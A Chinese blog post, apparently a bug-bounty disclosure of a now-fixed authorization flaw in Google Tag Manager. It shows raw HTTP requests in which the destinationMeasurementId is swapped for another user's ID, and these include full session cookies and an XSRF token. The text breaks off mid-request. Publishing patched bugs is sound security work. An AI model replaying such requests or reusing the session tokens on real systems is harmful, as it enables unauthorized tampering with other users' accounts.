---
title: google tagmanager idor - 飘渺红尘✨
url: https://www.cnblogs.com/piaomiaohongchen/p/19283283
source: 博客园 - 飘渺红尘✨
date: 2025-11-28
fetch_date: 2025-11-29T03:11:54.087148
---

# google tagmanager idor - 飘渺红尘✨

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/piaomiaohongchen/)

# [飘渺红尘](https://www.cnblogs.com/piaomiaohongchen)

## 永远年轻永远热泪盈眶,永远在路上 星光不问赶路人,时光不负有心人

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/piaomiaohongchen/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E9%A3%98%E6%B8%BA%E7%BA%A2%E5%B0%98%E2%9C%A8)
* 订阅
* [管理](https://i.cnblogs.com/)

# [google tagmanager idor](https://www.cnblogs.com/piaomiaohongchen/p/19283283 "发布于 2025-11-28 16:34")

谷歌安全团队这两天修复了我之前提交的安全漏洞，经过谷歌安全团队允许，完整无码公开下这份漏洞，这个漏洞相对简单，越权漏洞，危害较小，给了1337刀。

强如四大金刚，也会存在安全问题，在漏洞挖掘中要相信自己，要有信心，然后是耐心和仔细。

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251128161932126-1304233460.png)

https://analytics.google.com/

Vulnerability: Unauthorized binding of the destinationMeasurementId parameter can make it unavailable to all users：

you can see it and click it:

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251128162123879-1038556429.png)

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251128162157963-1013531218.png)

Located at the merged google code:

test account A：xxxx@gmail.com

account A’s destinationMeasurementId：AW-11012162035

attacked test account B：yyyy@gmail.com

account B’s destinationMeasurementId：AW-11012162036

![image](https://img2024.cnblogs.com/blog/1090320/202511/1090320-20251128162230934-414739015.png)

Triggering overrides via request packets：

vulnerability package:

User A captured packets and modified them to the destinationMeasurementId of user B (yyyy@gmail.com).:

```
POST /api/accounts/6061650545/containers/96205891/links?hl=zh-CN HTTP/2

Host: tagmanager.google.com

Cookie: SEARCH_SAMESITE=CgQIyZYB; OGPC=19022552-1:19031049-1:19031711-1:; OGP=-19031711:; _gid=GA1.3.910788705.1667230236; S=billing-ui-v3=l2IPg0gRGeDKnLZB7-fXfLeW3hegoBYI:billing-ui-v3-efe=l2IPg0gRGeDKnLZB7-fXfLeW3hegoBYI:sso=ORacg-Kfe_9VjUxDqi4zlBTWKGM9F25B; SID=QAhkoO0q4zvU8hTM0mo9PXCYIFNZ0b4wDF13uNkevfi5EJnmnJ0hr_bN9MB_zLKJP6PsOg.; __Secure-1PSID=QAhkoO0q4zvU8hTM0mo9PXCYIFNZ0b4wDF13uNkevfi5EJnm_OdY4YnhfqEk8eo9i_820g.; __Secure-3PSID=QAhkoO0q4zvU8hTM0mo9PXCYIFNZ0b4wDF13uNkevfi5EJnmR7Anp9akqTt4hkwO5J59dQ.; HSID=ALAtgfC5w3gQA6LO2; SSID=AuMAF8DGwdnXcNRN4; APISID=A64PStQYcvyb4sdN/A0-6BLNK2kjYTsBTu; SAPISID=IkOzPdm8iWhojkEX/AHvW0_J14JHhaghMV; __Secure-1PAPISID=IkOzPdm8iWhojkEX/AHvW0_J14JHhaghMV; __Secure-3PAPISID=IkOzPdm8iWhojkEX/AHvW0_J14JHhaghMV; 1P_JAR=2022-11-02-06; AEC=AakniGPP6zH9kp56q9cFnjxsrvB1noIjz_3-57ZAZW3THL0VktHv0ushDQ; NID=511=U_syozBK_L3yD831t5Nfl-KV1-29qJEgyPrh8dDy_6ZhKiuanh6UEhABRhHBI6dbg5uMrMs2ftETQuVQpYl8GT8opeogtOojMU18MtGyceATQ9mmMpaRKTCCiIcu4oRH_hfepquzFUonmdTdcdSHtm02cngAjOXTkpxMceiilGq7bJiZggiAas5ShwwoLUxVrYHWJgIR_i8vRDG2KyL-h-LSUCvuXwdgqMhPYvhY-dDj1-KxefUrkkxZXiJibilmfvOg0fjGUxNvlMjQ2QXinj37uVMMIlC927KWVOis4WEI; GTM-XSRF-TOKEN=ANXa6xYz1ZB0VdAFFCM-u39yetAdkWafNA:1667399210750; _ga=GA1.1.71947252.1666797705; SIDCC=AIKkIs1_CFww5hxb2oikZ_Igvr6VzKxB9ezBMOQzR_mel4HmtZlR_8y-2yk-gz2iYplkINmU-Q; __Secure-1PSIDCC=AIKkIs2KidYhXIvH_1Tq_T-rIY8NXoK9P4byfo6SWqh86PSFUr__NG1gymz67fbDn-ooSOvcfpA; __Secure-3PSIDCC=AIKkIs163oBr8yHbHbEt_K1YsXmBOLwcu5WlfejpwQATtiYe8ubdsMranECfKnpucyR3m2ceyg; _ga_K83D5QED08=GS1.1.1667399214.1.1.1667400931.0.0.0

Content-Length: 139

Sec-Ch-Ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"

X-Xsrf-Token: ANXa6xYz1ZB0VdAFFCM-u39yetAdkWafNA:1667399210750

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36

Ogt-Product: 1

Content-Type: application/json;charset=UTF-8

Accept: application/json, text/plain, */*

Sec-Ch-Ua-Platform: "macOS"

Origin: https://tagmanager.google.com

X-Client-Data: CJC2yQEIpLbJAQjEtskBCKmdygEI3tPKAQjOlMsBCJKhywEIobzMAQiVvcwBCIbdzAEIqN/MAQjH4MwBCMzjzAEI2OjMAQiv68wBCJvszAEIqu3MAQ==

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://tagmanager.google.com/lite/?app=GAFE&hl=zh-CN&origin=https%3A%2F%2Fanalytics.google.com

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9,es;q=0.8

Connection: close

{"properties":{"destinationInfo":{"destinationMeasurementId":"AW-11012162036","adsCustomerId":"1093733742","compatibleUsageContexts":[1]}}}
```

The problematic parameter is destinationMeasurementId.

You can modify, bind and merge other users' Google codes by traversing the destinationMeasurementId.

You need to trigger through the page, you can't directly use my data packet to re-send the packet, because there is X-Xsrf-Token.

Note that you only need to modify one parameter, that is the destinationMeasurementId parameter. This parameter has an unauthorized binding replacement.

Request this interface after binding the id：

```
GET /api/accounts/6061650545/containers/96205891?hl=zh-CN HTTP/2

Host: tagmanager.google.com

Cookie: SEARCH_SAMESITE=CgQIyZYB; OGPC=19022552-1:19031049-1:19031711-1:; OGP=-19031711:; _gid=GA1.3.910788705.1667230236; S=billing-ui-v3=l2IPg0gRGeDKnLZB7-fXfLeW3hegoBYI:billing-ui-v3-efe=l2IPg0gRGeDKnLZB7-fXfLeW3hegoBYI:sso=ORacg-Kfe_9VjUxDqi4zlBTWKGM9F25B; SID=QAhkoO0q4zvU8hTM0mo9PXCYIFNZ0b4wDF13uNkevfi5EJnmnJ0hr_bN9MB_zLKJP6PsOg.; __Secure-1PSID=QAhkoO0q4zvU8hTM0mo9PXCYIFNZ0b4wDF13uNkevfi5EJnm_OdY4YnhfqEk8eo9i_820g.; __Secure-3PSID=QAhkoO0q4zvU8hTM0mo9PXCYIFNZ0b4wDF13uNkevfi5EJnmR7Anp9akqTt4hkwO5J59dQ.; HSID=ALAtgfC5w3gQA6LO2; SSID=AuMAF8DGwdnXcNRN4; APISID=A64PStQYcvyb4sdN/A0-6BLNK2kjYTsBTu; SAPISID=IkOzPdm8iWhojkEX/AHvW0_J14JHhaghMV; __Secure-1PAPISID=IkOzPdm8iWhojkEX/AHvW0_J14JHhaghMV; __Secure-3PAPISID=IkOzPdm8iWhojkEX/AHvW0_J14JHhaghMV; 1P_JAR=2022-11-02-06; AEC=AakniGPP6zH9kp56q9cFnjxsrvB1noIjz_3-57ZAZW3THL0VktHv0ushDQ; NID=511=U_syozBK_L3yD831t5Nfl-KV1-29qJEgyPrh8dDy_6ZhKiuanh6UEhABRhHBI6dbg5uMrMs2ftETQuVQpYl8GT8opeogtOojMU18MtGyceATQ9mmMpaRKTCCiIcu4oRH_hfepquzFUonmdTdcdSHtm02cngAjOXTkpxMceiilGq7bJiZggiAas5ShwwoLUxVrYHWJgIR_i8vRDG2KyL-h-LSUCvuXwdgqMhPYvhY-dDj1-KxefUrkkxZXiJibilmfvOg0fjGUxNvlMjQ2QXinj37uVMMIlC927KWVOis4WEI; GTM-XSRF-TOKEN=ANXa6xYz1ZB0VdAFFCM-u39yetAdkWafNA:1667399210750; _ga=GA1.1.71947252.1666797705; SIDCC=AIKkIs2CJjNTM3W8-JeBIeVhQs8-T4uu65svTHUDwxV8yt3QD8-6OuJfFk5V-nc-i8xwMSBq5Q; __Secure-1PSIDCC=AIKkIs1qquWD2yVpCvV1bOSedQy3kSjUDea5v1bF7pDUIiv3FN2YBsFD2FeqZsYu3THvEaskywk; __Secure-3PSIDCC=AIKkIs2UPziv9VPAAKPezHuFTaFNcuQbHywYuVA4vpOFprkGNdWA3JIBVhKZxF3SdkS5Vgkl_A; _ga_K83D5QED08=GS1.1.1667399214.1.1.1667401237.0.0.0

Sec-Ch-Ua: "Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"

Accept: application/json, text/plain, */*

X-Xsrf-Token: ANXa6xYz1ZB0VdAFFCM-u39yetAdkWafNA:1667399210750

Sec-Ch-Ua-Mobile: ?0

Use...